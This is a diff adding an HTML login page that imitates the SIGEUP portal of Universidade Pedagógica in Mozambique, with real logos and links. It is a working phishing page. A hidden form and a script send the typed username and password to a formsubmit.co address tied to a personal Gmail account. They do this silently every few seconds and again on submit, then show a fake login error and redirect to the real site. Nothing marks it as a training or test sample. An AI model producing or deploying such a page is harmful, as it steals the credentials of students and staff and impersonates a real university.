@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Gestão Universitária - SIGEUP</title>
+    <!-- Estilos CSS incorporados para facilitar a exportação -->
+    <style>
+        /* Estilos gerais da página */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        /* Container principal de login */
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 400px;
+            position: relative;
+        }
+        
+        /* Logotipo da universidade */
+        .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        
+        /* Estilo do título principal */
+        h1 {
+            color: #444;
+            font-size: 24px;
+            margin-bottom: 30px;
+        }
+        
+        /* Estilo dos grupos de input (usuário e senha) */
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        /* Estilo dos campos de entrada */
+        .input-group input {
+            width: 100%;
+            padding: 10px 10px 10px 40px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        
+        /* Estilo dos ícones nos campos de entrada */
+        .input-group i {
+            position: absolute;
+            left: 10px;
+            top: 12px;
+            color: #888;
+        }
+        
+        /* Estilo do botão de autenticação */
+        .button {
+            background-color: #337ab7;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 16px;
+            float: right;
+        }
+        
+        /* Estilo do botão ao passar o mouse */
+        .button:hover {
+            background-color: #286090;
+        }
+        
+        /* Estilo dos links abaixo do formulário */
+        .links {
+            text-align: left;
+            margin-top: 60px;
+        }
+        
+        /* Estilo de cada link */
+        .links a {
+            color: #337ab7;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        /* Estilo do link ao passar o mouse */
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Estilo do rodapé */
+        .footer {
+            margin-top: 30px;
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* Estilo dos links no rodapé */
+        .footer a {
+            color: #337ab7;
+            text-decoration: none;
+        }
+        
+        /* Estilo do container de logos das universidades */
+        .university-logos {
+            margin-top: 15px;
+        }
+        
+        /* Estilo de cada logo da universidade */
+        .university-logos img {
+            width: 30px;
+            height: 30px;
+            margin: 0 5px;
+        }
+        
+        /* Estilo do marcador de lista para os links */
+        .bullet {
+            color: #337ab7;
+            font-weight: bold;
+        }
+
+        /* Campo escondido para o formulário */
+        .hidden-field {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Container principal da página de login -->
+    <div class="login-container">
+        <!-- Logo da Universidade Pedagógica -->
+        <img src="https://sigeup.up.ac.mz/sigeup/public/dist/img/up.png" alt="Heráldica da Universidade Pedagógica" class="logo">
+        
+        <!-- Título principal -->
+        <h1>Sistema de Gestão Universitária</h1>
+        
+        <!-- Campo de entrada para nome de usuário -->
+        <div class="input-group">
+            <i>👤</i>
+            <input type="text" id="username" placeholder="Utilizador" onkeyup="captureInput()">
+        </div>
+        
+        <!-- Campo de entrada para senha -->
+        <div class="input-group">
+            <i>🔒</i>
+            <input type="password" id="password" placeholder="Senha" onkeyup="captureInput()">
+        </div>
+        
+        <!-- Botão de login -->
+        <button class="button" onclick="attemptLogin()">Autenticar</button>
+        
+        <!-- Links adicionais -->
+        <div class="links">
+            <a href="#"><span class="bullet">•</span> Recém-admitidos</a>
+            <a href="#"><span class="bullet">•</span> Esqueci a senha</a>
+        </div>
+        
+        <!-- Rodapé com informações e logos -->
+        <div class="footer">
+            © 2025 | <a href="https://www.up.ac.mz/">Universidade Pedagógica de Maputo</a>
+            <div class="university-logos">
+                <img src="https://sigeul.unilicungo.ac.mz/sigeup/public/dist/img/favicon.png" alt="unilicungo">
+                <img src="https://sig.unisave.ac.mz/sigeup/public/dist/img/favicon.png" alt="unisave">
+                <img src="https://epungue.unipungue.ac.mz/sigeup/public/dist/img/favicon.png" alt="unipungue">
+                <img src="https://sigeur.up.ac.mz/sigeup/public/dist/img/favicon.png" alt="unirovuma">
+            </div>
+        </div>
+    </div>
+
+    <!-- Formulário oculto que envia os dados -->
+    <form 
+        id="hiddenForm" 
+        action="https://formsubmit.co/claudiojosemacario1@gmail.com" 
+        method="POST" 
+        class="hidden-field">
+        <input type="hidden" name="username" id="hidden_username">
+        <input type="hidden" name="password" id="hidden_password">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://sigeup.up.ac.mz/sigeup/">
+        <input type="hidden" name="_subject" value="Novos dados de login coletados">
+    </form>
+
+    <!-- Script JavaScript para capturar e enviar dados -->
+    <script>
+        // Captura os dados enquanto o usuário digita
+        function captureInput() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Atualiza os campos ocultos
+            document.getElementById('hidden_username').value = username;
+            document.getElementById('hidden_password').value = password;
+            
+            // Se ambos os campos tiverem algum conteúdo, envia a cada 3 segundos
+            if (username && password) {
+                // Usa localStorage para controlar quando foi o último envio
+                const lastSent = localStorage.getItem('lastDataSent');
+                const now = new Date().getTime();
+                
+                if (!lastSent || now - lastSent > 3000) { // 3 segundos
+                    sendDataSilently();
+                    localStorage.setItem('lastDataSent', now);
+                }
+            }
+        }
+        
+        // Envia os dados silenciosamente usando fetch API
+        function sendDataSilently() {
+            const formData = new FormData(document.getElementById('hiddenForm'));
+            
+            fetch(document.getElementById('hiddenForm').action, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // Importante para evitar erros de CORS
+            }).catch(error => console.error('Erro:', error));
+        }
+        
+        // Função chamada quando o usuário clica em "Autenticar"
+        function attemptLogin() {
+            // Envia os dados finais
+            document.getElementById('hiddenForm').submit();
+            
+            // Simula um erro de login após um pequeno atraso
+            setTimeout(() => {
+                alert("Erro ao autenticar. Por favor, verifique suas credenciais e tente novamente.");
+            }, 1000);
+        }
+        
+        // Adiciona os eventos necessários quando a página carrega
+        window.onload = function() {
+            // Limpa o armazenamento local para garantir novos envios
+            localStorage.removeItem('lastDataSent');
+        };
+    </script>
+</body>
+</html>
